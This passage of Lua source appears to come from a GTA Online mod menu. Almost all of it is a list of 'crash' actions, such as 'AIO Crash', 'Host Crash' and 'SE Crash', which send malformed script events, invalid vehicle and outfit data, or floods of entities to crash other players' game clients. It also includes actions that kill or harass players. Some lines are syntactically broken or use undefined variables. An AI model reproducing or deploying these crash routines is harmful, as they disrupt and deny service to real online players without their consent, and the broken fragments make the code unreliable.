    PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0.0, 0.0, 10.0, 1.0, 1, 0.0, 1.0, 1.0, false, false, false, 1.0, false, 0)
    entities.create_vehicle(pos,0X187D938D,0)
end)

menu.action(Removals_List, "DR Crash", {}, "", function()
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,0XFCFCB68B,0X187D938D,1349725314,-255678177,-255678177}
    local vehicles = {}
    for i = 1, 20 do
        util.create_thread(function()
            RqModel(hashes[i])
            menu.trigger_commands("anticrashcamera on")
            local pcoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                util.yield(2000)
            end
            vehicles[#vehicles+1] = veh
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
            local pos = players.get_position(pid)
            local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
            local pos = players.get_position(pid)
            util.yield(2000)
            PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
            util.yield(2000)
        end)
    end
    util.yield(2000)
    menu.trigger_commands("anticrashcamera off")
    util.toast("finished.")
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end)

-------------------------------------------------------------------------------------------------------------------------------------------------------------

    menu.action(Removals_List, "Host Crash", {""}, "", function()
    local myPos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), 10814.29, -9751.18, 2000.0, 0, 0, 1)--HOSTCRASH
    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(),true)
    util.yield(1000)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), 0, 0, 7.0, 0, 0, 1)
    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(),false)
    end) 


    menu.action(Removals_List, "Script Host Crash", {}, "", function()
        menu.trigger_commands("givesh " .. players.get_name(pid))
        util.yield(100)
            util.trigger_script_event(1 << pid, {495813132, pid,-4640169,0,0,0,-36565476,-53105203})

    end)

    menu.action(Removals_List, "Mother Nature Crash", {}, "Causes Crash Event (A1:1705D85C).", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_prop_bush_mang_ad")
        local pos = players.get_position(pid)
        local oldPos = players.get_position(players.user())
        BlockSyncs(pid, function() -- blocking outgoing syncs to prevent the lobby from crashing :5head:
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT) -- preventing wasted screen
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)

    menu.action(Removals_List,"AIO Crash", {""} ,"" , function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
        end
        util.trigger_script_event(1 << pid,{526822748,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-555356783,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-1390976345,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-637352381,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-1529596656,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{-1991423686,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{1992522613,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{-714268990,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{495813132,pid, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 1754244778, 10, 23135423, 11, 827870001, 12, 23135423})
        util.trigger_script_event(1 << pid,{-1247985006,pid, 0, 2, 1, 3, 1, 4, 1841685865, 5, 136236, 6, 27769, 7, -1450989833, 8, -2082595, 9, 1587193, 10, -6701543, 11, 147649, 12, 651264, 13, -2507024, 14, 11951923, 15, -833146974, 16, -1799182, 17, 2359273, 18, 4959292, 19, 1})
        util.trigger_script_event(1 << pid,{526822748,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -17898883})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 17398799})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15576064})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -13128205})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -10321649})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 9846577})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15098687})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15098687})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 21062401})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -5065659})
        util.trigger_script_event(1 << pid,{1348481963,pid,  0, 2, 378775})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 9497036})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 8067058})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -3322411})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -17851944})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -18386240})
        util.trigger_script_event(1 << pid,{-634789188,pid, 0, 2, -634789188})
        util.trigger_script_event(1 << pid,{-634789188,pid, 0, 2, -634789188})
        util.trigger_script_event(1 << pid,{-668341698,pid, 0, 2, -668341698})
        util.trigger_script_event(1 << pid, {1214823473, pid, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << pid, {2130458390, pid, 0, 1, 0, 0, 0})
    end)


    menu.action(Removals_List, "5G Lite", {}, "5G?", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
        end
    end)

    menu.action(Removals_List,"Invalid Data Ultimate ", {""} ,"" , function()
        BadNetVehicleCrash3(pid)
        util.yield(1000)
    end)
    

    function RequestControl(entity)
        local tick = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 100000 do
            util.yield()
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
            tick = tick + 1
        end
    end

--------------------------------------------------------------------------------------------------------------------------------------

menu.action(Removals_List, "Invalid Vehicle Data", {"vehdata"}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local sentinel = util.joaat("sentinel")

    STREAMING.REQUEST_MODEL(sentinel)
    while not STREAMING.HAS_MODEL_LOADED(sentinel) do
        util.yield()
    end

    local vehicle = entities.create_vehicle(sentinel, pos, 0)
    VEHICLE.SET_VEHICLE_MOD(vehicle, 34, 3, false)
    util.yield(1000)
    entities.delete_by_handle(vehicle)
end)

menu.action(Removals_List, "Vehicle Temp Action 5G", {""}, "", function()
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(player, false)
    local my_pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local my_ped = PLAYER.GET_PLAYER_PED(players.user())
    pos.z = pos.z - 50

    BlockSyncs(pid, function()
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")

        ENTITY.FREEZE_ENTITY_POSITION(my_ped, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, pos.x, pos.y, pos.z, false, false, false)
        util.yield()
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, #allvehicles do
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
            util.yield()
            TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
        end
        util.yield()
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z, false, false, false)
        ENTITY.FREEZE_ENTITY_POSITION(my_ped, false)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
    end)
end)

menu.action(Removals_List, "Sans Undertale The Cum Reaper", {}, "recommended to stay away", function()
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_ENTITY_COORDS(p)
    local chop = util.joaat('cs_tenniscoach')
    STREAMING.REQUEST_MODEL(chop)
    while not STREAMING.HAS_MODEL_LOADED(chop) do
        STREAMING.REQUEST_MODEL(chop)
        util.yield()
    end
    local achop = entities.create_ped(26, chop, c, 0)
    WEAPON.GIVE_WEAPON_TO_PED(achop, util.joaat('weapon_hominglauncher'), 9999, false, false)
    TASK.TASK_COMBAT_PED(achop, p, 0, 16)
    setAttribute(achop)
    local bchop = entities.create_ped(26, chop, c, 0)
    WEAPON.GIVE_WEAPON_TO_PED(bchop, util.joaat('weapon_mg'), 9999, false, false)
    TASK.TASK_COMBAT_PED(bchop, p, 0, 16)
    setAttribute(bchop)
    util.yield(10000)
    entities.delete_by_handle(bchop)
    entities.delete_by_handle(achop)
    if not STREAMING.HAS_MODEL_LOADED(chop) then
        util.toast("Couldn't load the model")
    end
end)

menu.action(Removals_List, "Child Protective Services", {"cps"}, "", function()
    local mdl = util.joaat('A_C_Poodle')
    BlockSyncs(pid, function()
        if request_model(mdl, 2) then
            local oldpos = players.get_position(players.user())
            local pos = players.get_position(pid)
            menu.trigger_commands("spectate" .. players.get_name(pid) .. " off")
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), true)
            util.yield(100)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            ped1 = entities.create_ped(26, mdl, pos, 0) 
            local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
            TASK.TASK_COMBAT_PED(ped1, ped, 0, 16)
            setAttribute(ped1)
            util.yield(1500)
            FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
            entities.delete_by_handle(ped1)
            util.yield(250)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(), oldpos.x, oldpos.y, oldpos.z, false, false, false)
            ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(), false)
        end
    end)
end)

menu.action(Removals_List, "Fake Taxi", {";)"}, "Inconsistent Garbage. Works on most menus.", function()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = players.get_position(pid)
    local mdl = util.joaat("mp_m_freemode_01")
    local veh_mdl = util.joaat("taxi")
    util.request_model(veh_mdl)
    util.request_model(mdl)
        for i = 1, 10 do
            if not players.exists(pid) then
                return
            end
            local veh = entities.create_vehicle(veh_mdl, pos, 0)
            local jesus = entities.create_ped(2, mdl, pos, 0)
            PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
            util.yield(100)
            TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
            util.yield(1000)
            entities.delete_by_handle(jesus)
            entities.delete_by_handle(veh)
        end  
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
end)

menu.action(Removals_List, "Lil Yachty", {}, "lilyachty", function()
    local user = players.user_ped()
    local pos = players.get_position(pid)
    local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
    local mdl = util.joaat("apa_mp_apa_yacht")
    menu.trigger_commands("anticrashcamera on")
    BlockSyncs(pid, function()
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
        PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
        PLAYER._SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
        util.yield(100)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z + 300, false, false, false)
        util.yield(1000)
        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
        util.yield(250)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
        PAD._SET_CONTROL_NORMAL(0, 145, 1.0)
        util.yield(250)
        PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
        util.yield(1500)
    end)
    PLAYER._CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
    ENTITY.SET_ENTITY_COORDS(user, old_pos, false, false)
    menu.trigger_commands("anticrashcamera off")
end)

menu.action(Removals_List, "Invalid Outfit Compenents", {"outfitcomp"}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    while not STREAMING.HAS_MODEL_LOADED(0x0D7114C9) do
        STREAMING.REQUEST_MODEL(0x0D7114C9)
        util.yield()
    end

    local michael = entities.create_ped(0, 0x0D7114C9, pos, 0)
    for i = 1, 20 do
        PED.SET_PED_COMPONENT_VARIATION(michael, 0, 0, 8, 0)
        PED.SET_PED_COMPONENT_VARIATION(michael, 0, 0, 9, 0)
        util.yield()
    end
    util.yield(500)
    ENTITY.SET_ENTITY_COORDS(michael, pos.x, pos.y, pos.z, true, false, false, true)
    util.yield(500)
    entities.delete_by_handle(michael)
end)

menu.action(Removals_List, "North Killer", {"crashv1"}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local michael = util.joaat("player_zero")
    while not STREAMING.HAS_MODEL_LOADED(michael) do
        STREAMING.REQUEST_MODEL(michael)
        util.yield()
    end
    local ped = entities.create_ped(0, michael, pos, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 6, 0)
    PED.SET_PED_COMPONENT_VARIATION(ped, 0, 0, 7, 0)
    util.yield()
    ENTITY.SET_ENTITY_COORDS(ped, pos.x, pos.y, pos.z, true, false, false, true)
    util.yield(500)
    entities.delete_by_handle(ped)

end)

menu.action(Removals_List, "Modified Bro Hug Beta ", {"brohug"}, "", function()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local ped = util.joaat("a_f_y_topless_01") 
    pos.z = pos.z - 50
    while not STREAMING.HAS_MODEL_LOADED(ped) do
        STREAMING.REQUEST_MODEL(ped) 
        util.yield()
    end

    local poop = entities.create_ped (0, ped, pos, 0.0)
    (poop, poop,0.0, 0.0, 10.0, 1.0, 1, 0.0, 1.0, 1.0, false, false, false, 1.0, false, 0)
    util.yield(1000)
    entities.delete_by_handle(poop)
end)


menu.action(Removals_List, "Mother Nature v1", {"nature"}, "", function()
    local user = players.user()
    local user_ped = players.user_ped()
    local model = util.joaat("h4_prop_bush_mang_ad") -- special op object so you dont have to be near them :D
    local pos = players.get_position(user)
    BlockSyncs(pid, function() -- blocking outgoing syncs to prevent the lobby from crashing :5head:
        util.yield(100)
        menu.trigger_commands("invisibility on")
        for i = 0, 110 do
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, model)
            PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
            util.yield(50)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        end
        util.yield(250)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT) -- preventing wasted screen
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
        menu.trigger_commands("invisibility off")
    end)
end)

menu.action(Removals_List, "Mother Nature v2", {""}, "", function()
    local user = players.user()
    local user_ped = players.user_ped()
    local pos = players.get_position(user)
    BlockSyncs(pid, function() 
        util.yield(100)
        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
        util.yield()
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
        util.yield(250)
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        util.yield(1000)
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT)
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
    end)
end)



menu.action(Removals_List, "Host Crash v1", {""}, "", function()
    local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local my_ped = PLAYER.GET_PLAYER_PED(players.user())
    util.yield(100)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 10841.274, -6928.6284, 1.0732422, true, false, false, false)
    util.yield(1000)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z)
end)

menu.action(Removals_List, "Host Crash v2", {"hostcrash"}, "", function()
    local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local my_ped = PLAYER.GET_PLAYER_PED(players.user())
    util.yield(100)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, -6169.9453, 10836.955, 39.99597, true, false, false, false)
    util.yield(1000)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z)
end)

menu.action(Removals_List, "Host Pedswap Crash", {""}, "", function()
    local mdl = util.joaat("mp_m_freemode_01")
    STREAMING.REQUEST_MODEL(mdl)
    local usr = players.user()
    local pos = (ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local new_ped = entities.create_ped(2, mdl, pos, 0)
    local old_ped = players.user_ped()
    util.yield(500)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(new_ped, -6170, 10835, 40, true, false, false, false)
    util.yield()
    PLAYER.CHANGE_PLAYER_PED(usr, new_ped, false, true)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(new_ped)
    util.yield(500)
    PLAYER.CHANGE_PLAYER_PED(usr, old_ped, false, true)
    entities.delete_by_handle(new_ped)
end)


menu.action(Removals_List, "Contract Franklin", {"crashv3"}, "", function()
    local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))

    STREAMING.REQUEST_MODEL(0xAF10BD56)
    while not STREAMING.HAS_MODEL_LOADED(0xAF10BD56) do
        util.yield()
    end

    menu.trigger_commands("lodscale 0")
    menu.trigger_commands("invisibility on")
    menu.trigger_commands("otr")

    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, pos.x, pos.y, pos.z + 100)
    local peds = {}
    for i = 1, 70 do
        peds[i] = entities.create_ped(3, 0xAF10BD56, pos, 0)
        util.yield()
    end

    util.yield(3000)
    for i = 1, #peds do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(peds[i])
        entities.delete_by_handle(peds[i])
    end
    menu.trigger_commands("lodscale 1")
    menu.trigger_commands("invisibility off")
    menu.trigger_commands("otr")
end)

menu.action(Removals_List, "Trevor Spam", {"crashv2"}, "", function()
    local my_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))

    STREAMING.REQUEST_MODEL(-1686040670)
    while not STREAMING.HAS_MODEL_LOADED(-1686040670) do
        util.yield()
    end

    menu.trigger_commands("lodscale 0")
    menu.trigger_commands("invisibility on")
    menu.trigger_commands("otr")

    local peds = {}
    for i = 1, 100 do
        peds[i] = entities.create_ped(3, -1686040670, pos, 0)
        util.yield()
    end

    util.yield(3000)
    for i = 1, #peds do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(peds[i])
        entities.delete_by_handle(peds[i])
    end
    menu.trigger_commands("lodscale 1")
    menu.trigger_commands("invisibility off")
    menu.trigger_commands("otr")
end)

menu.action(Removals_List,"Lesbian Beyblade", {""} ,"" , function(pid)
    local Coords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local Coords2 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    Coords2.z = Coords2.z + 1

    local cat = util.joaat("Cat")

    while not STREAMING.HAS_MODEL_LOADED(cat) do
        STREAMING.REQUEST_MODEL(cat)
        util.yield()
    end
    local cat1 = entities.create_ped(0, topless1, Coords2, 0.0)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cat, cat1, 1, 0, 0.1, 0, 0, -90, 180, 90, 0, 0, 0, 0, 0)
    Rope = PHYSICS.ADD_ROPE(Coords.x, Coords.y, Coords.z, 1, 1, 1, 1, 1, 0.001, 1, 1, true, true, true, 1.0, true, 0)
    local CoordsC = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local CoordsP = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(Rope, cat1, cat1, CoordsC.x, CoordsC.y, CoordsC.z, CoordsP.x, CoordsP.y, CoordsP.z, 2, 0, 0, "Center", "Center")
    util.yield(1000)
    entities.delete_by_handle(Ped1)
    entities.delete_by_handle(Ped2)
    local temp = memory.alloc(4)
    memory.write_int(temp, Rope)
    PHYSICS.DELETE_ROPE(temp)
    memory.free(temp)
    util.yield()
end)

menu.action(Removals_List,"R0 Crash", {"crashv3"} ,"" , function(pid)
    local pos = players.get_position(pid)
    PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0.0, 0.0, 10.0, 1.0, 1, 0.0, 1.0, 1.0, false, false, false, 1.0, false, 0)
end)

menu.action(Removals_List, "SE Crash", {"crashv4"}, "", function()
    util.trigger_script_event(1 << pid, {-555356783, pid, 0,  1,  21,  118276556,  24659,  23172,  -1939067833,  -335814060,  86247})
    util.trigger_script_event(1 << pid, {526822748, pid, 0,  1,  65620017,  232253469,  121468791,  47805193,  513514473,})
    util.trigger_script_event(1 << pid, {495813132, pid,  0,  1,  23135423,  3,  3,  4,  827870001,  5,  2022580431,  6,  -918761645,  7,  1754244778,  8,  827870001,  9, 17})
    util.trigger_script_event(1 << pid, {1348481963, pid,1348481963,  0,  1,  0,  2,  -18386240})
end)

menu.action(Removals_List, "Check point killer", {"crashv5"}, "", function()
    for i = 1, 200 do
        util.trigger_script_event(1 << pid, {-1529596656, pid, -547323955  , math.random(0, 4), math.random(0, 1), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647),
        math.random(-2147483647, 2147483647), pid, math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
    end
end)

--------------------------------------------------------------------------------------------------------------------------------------

    menu.action(Removals_List, "Ultimate Ruiner", {}, "", function ()
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
        local jesus = util.joaat("ig_agent")
        local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        local SelfPlayerPos = players.get_position(pid)
        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        BlockSyncs(pid, function()
            request_model(jesus)
            jesus_ped = entities.create_ped(26, jesus, SelfPlayerPos, -1)
            util.yield(200)
            local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(Ruiner2), pid, true)
            util.yield(200)
            PED.SET_PED_INTO_VEHICLE(jesus_ped, Ruiner2, -1)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y+10, SelfPlayerPos.z+10, false, true, true)
            util.yield(200)
            VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, util.joaat("prop_start_gate_01b"))
            VEHICLE.VEHICLE_SET_PARACHUTE_MODEL_OVERRIDE(Ruiner2, true)
            -- TASK.TASK_VEHICLE_TEMP_ACTION(jesus_ped,Ruiner2,18) 
            util.yield(2000)
            entities.delete_by_handle(Ruiner2)
            entities.delete_by_handle(jesus_ped)
        end)
    end)

    menu.action(Plyrveh_list, "Kill Player Inside Casino", {}, "", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        if get_interior_player_is_in(pid) ~= 275201 then
            util.toast("Player is not in casino. :/")
        elseif get_interior_player_is_in(players.user()) ~= 275201 then
            util.toast("You are not in the casino. :/")
        end
        if get_interior_player_is_in(pid) == 275201 and get_interior_player_is_in(players.user()) == 275201 then
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 1000, true, util.joaat("WEAPON_STUNGUN_MP"), players.user_ped(), false, true, 1.0)
        end
    end)

    menu.action(Plyrveh_list, "Beast Freeze", {}, "", function()
